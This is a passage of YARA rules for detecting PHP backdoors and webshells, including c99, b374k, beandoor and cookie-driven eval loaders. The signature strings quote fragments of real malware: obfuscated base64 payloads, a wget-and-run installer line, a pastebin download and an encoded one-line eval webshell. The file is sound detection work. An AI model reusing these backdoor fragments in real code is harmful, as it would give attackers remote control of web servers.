rule php_backdoor_b374kshell_002_02 : backdoor
{
    strings:
        $trigger = "b374k (login"
    condition:
        $trigger
}

rule php_backdoor_backdoor_installer_001 : backdoor
{
    strings:
        $trigger = "fwrite($hix, base64_decode($dirut));"
    condition:
        $trigger
}

rule php_backdoor_backdoor_installer_002 : backdoor
{
    strings:
        $trigger = ",base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydzZW5zZSddKTs/Pg=="
    condition:
        $trigger
}

private rule PR01400 : trigger
{
    strings:
        $ps0 = "system(\"cd \".$ar.\";wget -O"
    condition:
        $ps0
}

rule php_backdoor_backdoor_installer_005 : backdoor
{
    strings:
        $trigger = ".txt; php -f "
    condition:
        $trigger and PR01400
}

private rule PR01401 : trigger
{
    strings:
        $ps0 = "CURL"
    condition:
        $ps0
}

rule php_backdoor_backdoor_installer_006 : backdoor
{
    strings:
        $trigger = "DIRECTORY_SEPARATOR.'it.php','<?php  echo \"test_is_test\"; ?>');"
    condition:
        $trigger and PR01401
}

rule php_backdoor_backdoor_installer_007 : backdoor
{
    strings:
        $trigger = "'<?php '.base64_decode($shell).' ?>'.$backup_copy"
    condition:
        $trigger
}

rule php_backdoor_backdoor_installer_008 : backdoor
{
    strings:
        $trigger = "$g=array(\"Lmh0YWNjZXNz\"=>$c,\"Y2dpLXN0YXRlLmNnaQ==\"=>$f);"
    condition:
        $trigger and PR01362
}

rule php_backdoor_backdoor_installer_009 : backdoor
{
    strings:
        $trigger = "private function hasUnconfirmedBackdoors()"
    condition:
        $trigger and PR00391
}

private rule PR01402 : trigger
{
    strings:
        $ps0 = "$resultsx = file_get_contents"
    condition:
        $ps0
}

private rule PR01403 : trigger
{
    strings:
        $ps0 = "fwrite($"
    condition:
        $ps0
}

rule php_backdoor_backdoor_installer_010 : backdoor
{
    strings:
        $trigger = "file_get_contents(\"http://pastebin.com/raw"
    condition:
        $trigger and PR01402 and PR01403
}

private rule PR01404 : trigger
{
    strings:
        $ps0 = "->extractTo("
    condition:
        $ps0
}

private rule PR01405 : trigger
{
    strings:
        $ps0 = "foreach(scandir($"
    condition:
        $ps0
}

private rule PR01406 : trigger
{
    strings:
        $ps0 = "if (file_exists($file_name)"
    condition:
        $ps0
}

rule php_backdoor_backdoor_installer_011 : backdoor
{
    strings:
        $trigger = "print(file_put_contents($_REQUEST"
    condition:
        $trigger and PR01404 and PR01405 and PR01406
}

private rule PR01407 : trigger
{
    strings:
        $ps0 = "create_file($glob_pathMW"
    condition:
        $ps0
}

rule php_backdoor_backdoor_mw_001 : backdoor
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR01407 and PR01362
}

private rule PR01408 : trigger
{
    strings:
        $ps0 = "<title>404 Not Found</title>"
    condition:
        $ps0
}

rule php_backdoor_base64_006 : backdoor
{
    strings:
        $trigger = ".\"\".\"6\".\"\".\"\".\"4\"."
    condition:
        $trigger and PR00029 and PR00507 and PR01408
}

private rule PR01409 : trigger
{
    strings:
        $ps0 = "kY10pKTsjIyN5ZXYKJHJf"
    condition:
        $ps0
}

private rule PR01410 : trigger
{
    strings:
        $ps0 = "@eval($"
    condition:
        $ps0
}

private rule PR01411 : trigger
{
    strings:
        $ps0 = "'.'"
    condition:
        $ps0
}

rule php_backdoor_base64_007 : backdoor
{
    strings:
        $trigger = "='b"
    condition:
        $trigger and PR01409 and PR01410 and PR01411
}

private rule PR01412 : trigger
{
    strings:
        $ps0 = "uZz1yYW5kKDEsMjU1KS4nLicucmF"
    condition:
        $ps0
}

rule php_backdoor_base64_008 : backdoor
{
    strings:
        $trigger = "='b"
    condition:
        $trigger and PR01412 and PR01410 and PR01411
}

rule php_backdoor_base64_009 : backdoor
{
    strings:
        $trigger = "?>\" . base64_decode(\"Z2lm"
    condition:
        $trigger and PR00029
}

private rule PR01413 : trigger
{
    strings:
        $ps0 = "PD9waHAgLyo"
    condition:
        $ps0
}

private rule PR01414 : trigger
{
    strings:
        $ps0 = "ZXZ"
    condition:
        $ps0
}

rule php_backdoor_base64_010 : backdoor
{
    strings:
        $trigger = "Ki8gPz48P3BocCBpZihpc3NldCgkX0dFVF"
    condition:
        $trigger and PR01413 and PR01414
}

private rule PR01415 : trigger
{
    strings:
        $ps0 = "fopen("
    condition:
        $ps0
}

rule php_backdoor_base64_012 : backdoor
{
    strings:
        $trigger = ")?base64_decode("
    condition:
        $trigger and PR01403 and PR01415
}

private rule PR01416 : trigger
{
    strings:
        $ps0 = "array(base64_decode("
    condition:
        $ps0
}

private rule PR01417 : trigger
{
    strings:
        $ps0 = "basename(__FILE__,base64_decode("
    condition:
        $ps0
}

rule php_backdoor_base64_013 : backdoor
{
    strings:
        $trigger = "fopen("
    condition:
        $trigger and PR01416 and PR01417 and PR01403
}

private rule PR01418 : trigger
{
    strings:
        $ps0 = "$_F=__FILE__;$_X='Pz48P3BocCA"
    condition:
        $ps0
}

rule php_backdoor_beandoor_001 : backdoor
{
    strings:
        $trigger = "XH"
    condition:
        $trigger and PR01418
}

rule php_backdoor_beandoor_001_003 : backdoor
{
    strings:
        $trigger = "$_F=__FILE__;$_X='Pz48P3BocCA0Zig0c3M1dCgkX0dFVFsi"
    condition:
        $trigger
}

private rule PR01419 : trigger
{
    strings:
        $ps0 = "$_F=__FILE__;$_X"
    condition:
        $ps0
}

rule php_backdoor_beandoor_002_001 : backdoor
{
    strings:
        $trigger = "Pz48P3BocA0KDQovKioNCiAqIEAxM3RoMnIgSWtyMW0gQUxJDQogKiBAYzJweXI0Z2h0IGEw"
    condition:
        $trigger and PR01419
}

private rule PR01420 : trigger
{
    strings:
        $ps0 = "aXNzZXQoJF9HRVRbJ2xvYWRiZWFuJ10p"
    condition:
        $ps0
}

rule php_backdoor_beandoor_002_002 : backdoor
{
    strings:
        $trigger = "$_GE"
    condition:
        $trigger and PR01420
}

rule php_backdoor_beandoor_002_003 : backdoor
{
    strings:
        $trigger = "$_F=__FILE__;$_X='Pz48P3BocA0KJDEzdGhfcDFzcyA9IG1kaSgiYjUxbmQyMnIiKTsNCiRjMmwyciA"
    condition:
        $trigger
}

rule php_backdoor_beandoor_002_004 : backdoor
{
    strings:
        $trigger = "$_F=__FILE__;$_X='Pz48P3BocCANCiQzcmwg"
    condition:
        $trigger
}

rule php_backdoor_beandoor_004 : backdoor
{
    strings:
        $trigger = "$_F=__FILE__;$_X='Pz48P3BocCAkM3JsID0gJ2h0dHA6Ly85"
    condition:
        $trigger
}

rule php_backdoor_beandoor_005 : backdoor
{
    strings:
        $trigger = "$_F=__FILE__;$_X='Pz48P3BocA0KDQoNCg0KDQo0ZigkMTN0"
    condition:
        $trigger
}

rule php_backdoor_beandoor_006 : backdoor
{
    strings:
        $trigger = "$_F=__FILE__;$_X='Pz48P3BocCAjIFc1YiBTaDVsbCBie"
    condition:
        $trigger
}

private rule PR01421 : trigger
{
    strings:
        $ps0 = "$auth_pass = \""
    condition:
        $ps0
}

rule php_backdoor_blackhat_shell_001 : backdoor
{
    strings:
        $trigger = "$blackhat"
    condition:
        $trigger and PR01421
}

private rule PR01422 : trigger
{
    strings:
        $ps0 = "base64_decode"
    condition:
        $ps0
}

rule php_backdoor_BoffMax_001 : backdoor
{
    strings:
        $trigger = "BoffMax"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR01423 : trigger
{
    strings:
        $ps0 = "if ($info->work==\"false\") $bot_start = false;"
    condition:
        $ps0
}

rule php_backdoor_botshell_001 : backdoor
{
    strings:
        $trigger = "config"
    condition:
        $trigger and PR01423
}

private rule PR01424 : trigger
{
    strings:
        $ps0 = "if (strcmp(strtolower($chat), $start_bot) == 0) {"
    condition:
        $ps0
}

rule php_backdoor_botshell_001_02 : backdoor
{
    strings:
        $trigger = "config"
    condition:
        $trigger and PR01424
}

private rule PR01425 : trigger
{
    strings:
        $ps0 = "config"
    condition:
        $ps0
}

rule php_backdoor_botshell_001_03 : backdoor
{
    strings:
        $trigger = "if ($bot_start==true) post_cbox($mess);"
    condition:
        $trigger and PR01425
}

private rule PR01426 : trigger
{
    strings:
        $ps0 = ">SpamBOT"
    condition:
        $ps0
}

rule php_backdoor_botshell_001_04 : backdoor
{
    strings:
        $trigger = "config"
    condition:
        $trigger and PR01426
}

rule php_backdoor_botshell_001_05 : backdoor
{
    strings:
        $trigger = "$fp2 = @fopen(\"proxy.txt\", \"r\");"
    condition:
        $trigger and PR01425
}

private rule PR01427 : trigger
{
    strings:
        $ps0 = "function handle_bot_cmd_shell() {"
    condition:
        $ps0
}

rule php_backdoor_botshell_002 : backdoor
{
    strings:
        $trigger = "base64_decode($_POST["
    condition:
        $trigger and PR01427
}

rule php_backdoor_botshell_003 : backdoor
{
    strings:
        $trigger = ")));';extract(['f'=>'create_function','b'=>'base64_decode']);$"
    condition:
        $trigger and PR00029
}

private rule PR01428 : trigger
{
    strings:
        $ps0 = "\"http"
    condition:
        $ps0
}

private rule PR01429 : trigger
{
    strings:
        $ps0 = "\"rpc_server\";"
    condition:
        $ps0
}

private rule PR01430 : trigger
{
    strings:
        $ps0 = "function execute_command"
    condition:
        $ps0
}

private rule PR01431 : trigger
{
    strings:
        $ps0 = "file_get_contents"
    condition:
        $ps0
}

rule php_backdoor_botshell_004 : backdoor
{
    strings:
        $trigger = "\"TEAM_CC\";"
    condition:
        $trigger and PR01428 and PR01429 and PR01430 and PR01021 and PR01431
}

rule php_backdoor_c0derzshell_001 : backdoor
{
    strings:
        $trigger = "7TppUxtJsp+HCP5DusxOS7vowgiwpBaDPWKGeBgYJOzYQISi1F2SO"
    condition:
        $trigger and PR00029
}

rule php_backdoor_c100shell_001_002 : backdoor
{
    strings:
        $trigger = "$proxy_shit=\"H4sIALMXx0QAA+RafXhU1Zm/"
    condition:
        $trigger and PR00013
}

rule php_backdoor_c99shell_001 : backdoor
{
    strings:
        $trigger = "; c99shexit();"
    condition:
        $trigger
}

rule php_backdoor_c99shell_001_003 : backdoor
{
    strings:
        $trigger = "Shell code by "
    condition:
        $trigger
}

rule php_backdoor_c99shell_001_02 : backdoor
{
    strings:
        $trigger = "function c99shexit"
    condition:
        $trigger
}

private rule PR01432 : trigger
{
    strings:
        $ps0 = "7b1re9u2sjD6ee/n2f8BYdVEanWzk7SNHTt1YqfxWU6cZTuru8fx1qJISmJNkSpJ"
    condition:
        $ps0
}

rule php_backdoor_c99shell_001_04 : backdoor
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR01432
}

rule php_backdoor_c99shell_001_05 : backdoor
{
    strings:
        $trigger = "c99sh_surl"
    condition:
        $trigger
}

rule php_backdoor_c99shell_001_06 : backdoor
{
    strings:
        $trigger = "HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXefMcFU"
    condition:
        $trigger and PR00029
}

rule php_backdoor_c99shell_002 : backdoor
{
    strings:
        $trigger = "$b5f = create_function('$'.'v',$a5"
    condition:
        $trigger
}

rule php_backdoor_c99shell_003 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(strrev('/0///973n3"
    condition:
        $trigger
}

private rule PR01433 : trigger
{
    strings:
        $ps0 = "7b17f9vG0TD6d/v75TusEaYmE5KiZOcmWXJkSY59alt+JLlpXtmHBQlQQkUSDABKdl"
    condition:
        $ps0
}

rule php_backdoor_c99shell_004 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR01433
}

rule php_backdoor_c99shell_005 : backdoor
{
    strings:
        $trigger = "7X1rcxs5kuBnd0T/B7ia3STHfMpv0ZQt62G7bUtqS7bbLSkYRVaR"
    condition:
        $trigger and PR00029 and PR01422
}

rule php_backdoor_c99shell_006 : backdoor
{
    strings:
        $trigger = "cda2c99fbf5e19f20d331299c15a4491"
    condition:
        $trigger and PR01421
}

private rule PR01434 : trigger
{
    strings:
        $ps0 = "if (empty($access_key) || (isset($_REQUEST['key']) && $_REQUEST['key'] == $access_key)) {"
    condition:
        $ps0
}

rule php_backdoor_c99shell_007 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR01434 and PR00029
}

private rule PR01435 : trigger
{
    strings:
        $ps0 = "7P1pW+NIsgCMfr7zPPMfVB6mCwbjDbMVBd3yBgZsY5vNrqqXkS1ZFl"
    condition:
        $ps0
}

rule php_backdoor_c99shell_008 : backdoor
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR00029 and PR01435
}

rule php_backdoor_c99shell_009 : backdoor
{
    strings:
        $trigger = "<input type=hidden name=a value=\"FilesMAn\">"
    condition:
        $trigger and PR00029 and PR00507
}

private rule PR01436 : trigger
{
    strings:
        $ps0 = "gzinflate(base64_decode("
    condition:
        $ps0
}

private rule PR01437 : trigger
{
    strings:
        $ps0 = "JGxvZ2luPSI5MTMiOyRtZDVfcGFzcz0iNjk3MWYxYmZjODE3NDZjMzM5MjNiOWY3ZDhiZjU3ODYiOw=="
    condition:
        $ps0
}

rule php_backdoor_c99shell_010 : backdoor
{
    strings:
        $trigger = "strrev(\"edoced_46esab\")"
    condition:
        $trigger and PR01436 and PR00029 and PR01437
}

rule php_backdoor_c99shell_011 : backdoor
{
    strings:
        $trigger = "iI7CiB9Cn0KaWYgKCRhY3QgPT0gInVwZGF0ZSIpIHskcmV0ID0gYzk5c2hfZ2V0dXBkYXRlKCEhJGNvbmZpcm11cGRhd"
    condition:
        $trigger and PR01398
}

private rule PR01438 : trigger
{
    strings:
        $ps0 = "if (strpos($file_content, 'Cache_Class') === false)"
    condition:
        $ps0
}

private rule PR01439 : trigger
{
    strings:
        $ps0 = "$_SERVER["
    condition:
        $ps0
}

rule php_backdoor_cache_module_001 : backdoor
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR01438 and PR01439
}

private rule PR01440 : trigger
{
    strings:
        $ps0 = "Cache_Class::update_content($content, $GLOBALS['global_code'])"
    condition:
        $ps0
}

rule php_backdoor_cache_module_002 : backdoor
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR01439 and PR01440
}

private rule PR01441 : trigger
{
    strings:
        $ps0 = "cache_content` (`url`, `code`, `ID`) VALUES"
    condition:
        $ps0
}

rule php_backdoor_cache_module_003 : backdoor
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR01441 and PR01439
}

rule php_backdoor_cache_module_005 : backdoor
{
    strings:
        $trigger = "file_put_contents($cache_dir . $code,$x);"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_backdoor_cgienabler_001 : backdoor
{
    strings:
        $trigger = "AddHandler"
        $php_backdoor_cgienabler_001_r0 = /AddHandler cgi-script (\.evil|\.cin|\.jpg|\.png|\.mcc|\.alfa)/
    condition:
        $trigger and $php_backdoor_cgienabler_001_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_cgienabler_001_02 : backdoor
{
    strings:
        $trigger = "AddType application"
        $php_backdoor_cgienabler_001_02_r0 = /AddType application.x-httpd-cgi (\.png|\.jpg|\.mcc|\.izri|\.evil|\.alfa|\.cin|\.ss)/
    condition:
        $trigger and $php_backdoor_cgienabler_001_02_r0
}

rule php_backdoor_charlichaplin_001 : backdoor
{
    strings:
        $trigger = "$backdoor->shell = $shell"
    condition:
        $trigger
}

rule php_backdoor_check_copyright_001 : backdoor
{
    strings:
        $trigger = "$check_copyright = create_function"
    condition:
        $trigger
}

private rule PR01442 : trigger
{
    strings:
        $ps0 = "{case  \"home\":home();break;case  \"up\":up();break;case  \"upload\":if(!isset($_FILES['upfile'])){printerror('"
    condition:
        $ps0
}

rule php_backdoor_chinese_shell_001 : backdoor
{
    strings:
        $trigger = "header('Content-Type:"
    condition:
        $trigger and PR01021 and PR01442 and PR01431
}

private rule PR01443 : trigger
{
    strings:
        $ps0 = "function sqlbackup($ip,$sql,$username,$password)"
    condition:
        $ps0
}

private rule PR01444 : trigger
{
    strings:
        $ps0 = "str_replace("
    condition:
        $ps0
}

rule php_backdoor_chinese_shell_003 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00092 and PR01443 and PR01444
}

private rule PR01445 : trigger
{
    strings:
        $ps0 = "system("
    condition:
        $ps0
}

rule php_backdoor_chmod_001 : backdoor
{
    strings:
        $trigger = "<?php print '! -_-\" Permissions Changed"
    condition:
        $trigger and PR01445
}

private rule PR01446 : trigger
{
    strings:
        $ps0 = "$filetemp = './wp-admin/"
    condition:
        $ps0
}

rule php_backdoor_chmod_002 : backdoor
{
    strings:
        $trigger = "@chmod($filetemp,0755);"
    condition:
        $trigger and PR01446 and PR00397 and PR01382
}

rule php_backdoor_chmod_003 : backdoor
{
    strings:
        $trigger = "@copy($fromfile,$tofile);@chmod($tofile,0444);}if(isset($_REQUEST['test"
    condition:
        $trigger and PR00435
}

private rule PR01447 : trigger
{
    strings:
        $ps0 = "$Class_WP_Index3($Class_WP_Index"
    condition:
        $ps0
}

rule php_backdoor_class_wp_index_001 : backdoor
{
    strings:
        $trigger = "\\x7"
    condition:
        $trigger and PR01447
}

rule php_backdoor_cmd_executer_001 : backdoor
{
    strings:
        $trigger = ".exec($_POST['executer'])"
    condition:
        $trigger
}

rule php_backdoor_code_password_001 : backdoor
{
    strings:
        $trigger = "preg_replace(\"\\043\\056\\052\\043\\145\","
    condition:
        $trigger and PR00732
}

private rule PR01448 : trigger
{
    strings:
        $ps0 = "<input type=\"submit\" value=\"GeT Passwords"
    condition:
        $ps0
}

rule php_backdoor_code_password_002 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR01448 and PR00507
}

private rule PR01449 : trigger
{
    strings:
        $ps0 = "$tempfile=tempnam(__FILE__,'');"
    condition:
        $ps0
}

rule php_backdoor_codeinclude_001 : backdoor
{
    strings:
        $trigger = "include($tmp);"
    condition:
        $trigger and PR00732 and PR01449
}

rule php_backdoor_codeinclude_002 : backdoor
{
    strings:
        $trigger = "file_put_contents($c,'<?php '.$a); include($c)"
    condition:
        $trigger and PR01351
}

rule php_backdoor_CodeNewbieCrewshell_001 : backdoor
{
    strings:
        $trigger = "gzinflate(str_rot13(base64_decode($f1b3r))));"
    condition:
        $trigger
}

private rule PR01450 : trigger
{
    strings:
        $ps0 = "\"\\x62\\x61\\x73\\x65\\x36\\x34\\x5"
    condition:
        $ps0
}

rule php_backdoor_con7ext_shell_001 : backdoor
{
    strings:
        $trigger = "($con7ext"
    condition:
        $trigger and PR00029 and PR01450
}

rule php_backdoor_cookey_001 : backdoor
{
    strings:
        $trigger = "4cookey"
    condition:
        $trigger
}

private rule PR01451 : trigger
{
    strings:
        $ps0 = "if(@$_COOKIE["
    condition:
        $ps0
}

rule php_backdoor_cookie_001_02 : backdoor
{
    strings:
        $trigger = "](@$_COOKIE["
    condition:
        $trigger and PR01451
}

rule php_backdoor_cookie_002 : backdoor
{
    strings:
        $trigger = "if(file_exists($doc))"
    condition:
        $trigger
}

private rule PR01452 : trigger
{
    strings:
        $ps0 = "cook"
    condition:
        $ps0
}

private rule PR01453 : trigger
{
    strings:
        $ps0 = ");header(\"Location:"
    condition:
        $ps0
}

rule php_backdoor_cookie_004 : backdoor
{
    strings:
        $trigger = "die();"
    condition:
        $trigger and PR01452 and PR01453
}

private rule PR01454 : trigger
{
    strings:
        $ps0 = "=$_COOKIE;"
    condition:
        $ps0
}

rule php_backdoor_cookie_005 : backdoor
{
    strings:
        $trigger = "];if(isset($"
    condition:
        $trigger and PR01454
}

private rule PR01455 : trigger
{
    strings:
        $ps0 = "curl_init($_COOKIE['user_name']"
    condition:
        $ps0
}

private rule PR01456 : trigger
{
    strings:
        $ps0 = "$role.='/'.$_COOKIE['user_id'];"
    condition:
        $ps0
}

rule php_backdoor_cookie_008 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR01455 and PR01456 and PR00397
}

// MANUAL FIX NECESSARY
rule php_backdoor_cookie_012 : backdoor
{
    strings:
        $trigger = "_COOKIE"
        $php_backdoor_cookie_012_r0 = /isset\(\$_COOKIE\['\w+'\]\)&&\(\$\w+=\$_COOKIE\['\w+'\]\)&&file_exists\(\$\w+\)&&require_once\(\$\w+\);/
    condition:
        $trigger and $php_backdoor_cookie_012_r0
}

private rule PR01457 : trigger
{
    strings:
        $ps0 = "rawurldecode('%62' . '%61' . '%73' . '%65%3' . '6%34%' . '5f%'"
    condition:
        $ps0
}

rule php_backdoor_cookie_013 : backdoor
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR01457
}

// MANUAL FIX NECESSARY
private rule PR01458 : trigger
{
    strings:
        $ps0 = "file_exists"
    condition:
        $ps0
}

rule php_backdoor_cookie_014 : backdoor
{
    strings:
        $trigger = "require_once"
        $php_backdoor_cookie_014_r0 = /isset[\s]*\([\s]*\$_COOKIE\[.[\w]+.\][\s]*\)[\s]*&&[\s]*\([\s]*\$[\w]+[\s]*=[\s]*\$_COOKIE\[.[\w]+.\][\s]*\)[\s]*&&[\s]*file_exists[\s]*\([\s]*\$[\w]+[\s]*\)[\s]*&&[\s]*require_once[\s]*\([\s]*\$[\w]+[\s]*\);/
    condition:
        $trigger and PR00391 and PR01458 and $php_backdoor_cookie_014_r0
}

private rule PR01459 : trigger
{
    strings:
        $ps0 = "JGRvYz0kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLiIvd3AtbG9hZC5waHAiOw0KaWY"
    condition:
        $ps0
}

rule php_backdoor_cookie_015 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR01459
}

private rule PR01460 : trigger
{
    strings:
        $ps0 = "@$_COOKIE"
    condition:
        $ps0
}

private rule PR01461 : trigger
{
    strings:
        $ps0 = "__construct()"
    condition:
        $ps0
}

private rule PR01462 : trigger
{
    strings:
        $ps0 = "public function __destruct()"
    condition:
        $ps0
}

rule php_backdoor_cookie_016 : backdoor
{
    strings:
        $trigger = "sys_get_temp_dir() . \"/\" . crc32("
    condition:
        $trigger and PR01460 and PR01461 and PR01462
}

private rule PR01463 : trigger
{
    strings:
        $ps0 = "=tmpfile();fwrite($"
    condition:
        $ps0
}

rule php_backdoor_cookie_017 : backdoor
{
    strings:
        $trigger = "if(isset($_COOKIE[\""
    condition:
        $trigger and PR01463
}

rule php_backdoor_COOKIE_eval_003 : backdoor
{
    strings:
        $trigger = "extract($_COOKIE, 1);"
    condition:
        $trigger
}

rule php_backdoor_COOKIE_eval_004 : backdoor
{
    strings:
        $trigger = "@$_COOKIE[\"user\"]($_COOKIE[\"id\"]);"
    condition:
        $trigger
}

rule php_backdoor_COOKIE_eval_005 : backdoor
{
    strings:
        $trigger = "@$_COOKIE[set]($_COOKIE[test]);"
    condition:
        $trigger
}

rule php_backdoor_COOKIE_eval_006 : backdoor
{
    strings:
        $trigger = "@register_tick_function("
    condition:
        $trigger and PR01460
}

private rule PR01464 : trigger
{
    strings:
        $ps0 = "){return @$"
    condition:
        $ps0
}

private rule PR01465 : trigger
{
    strings:
        $ps0 = "Array("
    condition:
        $ps0
}

private rule PR01466 : trigger
{
    strings:
        $ps0 = "eval"
    condition:
        $ps0
}

rule php_backdoor_COOKIE_eval_007 : backdoor
{
    strings:
        $trigger = "]));exit();}}"
    condition:
        $trigger and PR01464 and PR00391 and PR01465 and PR01466
}

private rule PR01467 : trigger
{
    strings:
        $ps0 = "(substr($_COOKIE[0],1)));$"
    condition:
        $ps0
}

rule php_backdoor_COOKIE_eval_008 : backdoor
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR01467
}

private rule PR01468 : trigger
{
    strings:
        $ps0 = "file_put_contents($"
    condition:
        $ps0
}

private rule PR01469 : trigger
{
    strings:
        $ps0 = "strpos("
    condition:
        $ps0
}

private rule PR01470 : trigger
{
    strings:
        $ps0 = "PD9waHAKJE1oID0gJ2VzY"
    condition:
        $ps0
}

rule php_backdoor_COOKIE_eval_009 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR01469 and PR01470
}

private rule PR01471 : trigger
{
    strings:
        $ps0 = "=\"\\x5f\\x43\\x4f\\x4f\\x4b\\x49E\";$"
    condition:
        $ps0
}

rule php_backdoor_COOKIE_eval_010 : backdoor
{
    strings:
        $trigger = "\"\\x63\\x72\\x65a\\x74\\x65_\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\""
    condition:
        $trigger and PR01471
}

private rule PR01472 : trigger
{
    strings:
        $ps0 = ");if(!empty($_"
    condition:
        $ps0
}

private rule PR01473 : trigger
{
    strings:
        $ps0 = "@$_POST[$_"
    condition:
        $ps0
}

rule php_backdoor_COOKIE_eval_011 : backdoor
{
    strings:
        $trigger = "eval"
    condition:
        $trigger and PR01472 and PR01473 and PR00391 and PR01465
}

rule php_backdoor_COOKIE_eval_012 : backdoor
{
    strings:
        $trigger = "(!function_exists('curl_init')) ? file_get_contents($"
    condition:
        $trigger and PR01398
}

private rule PR01474 : trigger
{
    strings:
        $ps0 = "count"
    condition:
        $ps0
}

rule php_backdoor_COOKIE_eval_014 : backdoor
{
    strings:
        $trigger = "]))) && @eval($"
    condition:
        $trigger and PR01474 and PR00391
}

private rule PR01475 : trigger
{
    strings:
        $ps0 = "@$decode($reverse($_REQUEST[$auth]))"
    condition:
        $ps0
}

rule php_backdoor_create_function_011 : backdoor
{
    strings:
        $trigger = "if (!empty($_REQUEST["
    condition:
        $trigger and PR01475
}

// MANUAL FIX NECESSARY
rule php_backdoor_create_function_012 : backdoor
{
    strings:
        $trigger = "REQUE"
        $php_backdoor_create_function_012_r0 = /[md5'\.]{6,};[\s]*if\(\$[\w]\(\$_REQUEST\[\$[\w]\]\)==.[\w]{25,}.\)\{/
    condition:
        $trigger and $php_backdoor_create_function_012_r0
}

private rule PR01476 : trigger
{
    strings:
        $ps0 = "crkekatkek_kfkukncktkikon"
    condition:
        $ps0
}

rule php_backdoor_create_function_013 : backdoor
{
    strings:
        $trigger = "str_replace"
    condition:
        $trigger and PR01476
}

rule php_backdoor_create_function_014 : backdoor
{
    strings:
        $trigger = "$JSubMenuHelper = create_function('', $JSubMenu);"
    condition:
        $trigger
}

private rule PR01477 : trigger
{
    strings:
        $ps0 = "} ^ $"
    condition:
        $ps0
}

private rule PR01478 : trigger
{
    strings:
        $ps0 = "++, $"
    condition:
        $ps0
}

private rule PR01479 : trigger
{
    strings:
        $ps0 = "base64_decod"
    condition:
        $ps0
}

rule php_backdoor_create_function_015 : backdoor
{
    strings:
        $trigger = "'](null, $"
    condition:
        $trigger and PR01477 and PR01478 and PR01479
}

private rule PR01480 : trigger
{
    strings:
        $ps0 = "str_replace"
    condition:
        $ps0
}

private rule PR01481 : trigger
{
    strings:
        $ps0 = "kses_"
    condition:
        $ps0
}

private rule PR01482 : trigger
{
    strings:
        $ps0 = "$prepare"
    condition:
        $ps0
}

rule php_backdoor_create_function_016 : backdoor
{
    strings:
        $trigger = "strrev("
    condition:
        $trigger and PR01480 and PR01481 and PR01482
}

private rule PR01483 : trigger
{
    strings:
        $ps0 = "create_function"
    condition:
        $ps0
}

private rule PR01484 : trigger
{
    strings:
        $ps0 = "preg_match('#<img src=\"data:image/png;base64,(.*)\">#"
    condition:
        $ps0
}

rule php_backdoor_create_function_016_02 : backdoor
{
    strings:
        $trigger = "base64_decode($wp_kses_data);"
    condition:
        $trigger and PR01483 and PR01484
}

private rule PR01485 : trigger
{
    strings:
        $ps0 = "a3Nlc19zdHIgPSBzdHJfc"
    condition:
        $ps0
}

rule php_backdoor_create_function_016_03 : backdoor
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR00029 and PR01485
}

private rule PR01486 : trigger
{
    strings:
        $ps0 = "= strrev($"
    condition:
        $ps0
}

private rule PR01487 : trigger
{
    strings:
        $ps0 = "sserpmocnuzg"
    condition:
        $ps0
}

private rule PR01488 : trigger
{
    strings:
        $ps0 = "edoced_46esab"
    condition:
        $ps0
}

rule php_backdoor_create_function_017 : backdoor
{
    strings:
        $trigger = "noitcnuf_etaerc"
    condition:
        $trigger and PR01486 and PR01487 and PR01488
}

private rule PR01489 : trigger
{
    strings:
        $ps0 = "= create_function(\"\", $"
    condition:
        $ps0
}

private rule PR01490 : trigger
{
    strings:
        $ps0 = "isset($_POST["
    condition:
        $ps0
}

rule php_backdoor_create_function_019 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR01489 and PR01490
}

private rule PR01491 : trigger
{
    strings:
        $ps0 = "_PTTH[REVRES_$(edoced_46esab(lave'));@$"
    condition:
        $ps0
}

rule php_backdoor_create_function_020 : backdoor
{
    strings:
        $trigger = "strre"
    condition:
        $trigger and PR01491
}

rule php_backdoor_create_function_021 : backdoor
{
    strings:
        $trigger = "$(lave'));"
    condition:
        $trigger and PR01483
}

rule php_backdoor_create_function_022 : backdoor
{
    strings:
        $trigger = "@create_function('', $_POST["
    condition:
        $trigger
}

rule php_backdoor_create_function_023 : backdoor
{
    strings:
        $trigger = "(\"#/\\*\\*(.*)\\*\\*/#se\",implode"
    condition:
        $trigger and PR00091
}

// MANUAL FIX NECESSARY
rule php_backdoor_create_function_024 : backdoor
{
    strings:
        $trigger = ".$"
        $php_backdoor_create_function_024_r0 = /@[cC][rR][eE][aA][tT][eE]_[fF][uU][nN][cC][tT][iI][oO][nN]\(..,\\"\};[\s]*[uU][nN][sS][eE][tT]\(/
    condition:
        $trigger and PR00719 and $php_backdoor_create_function_024_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_create_function_025 : backdoor
{
    strings:
        $trigger = "\".chr("
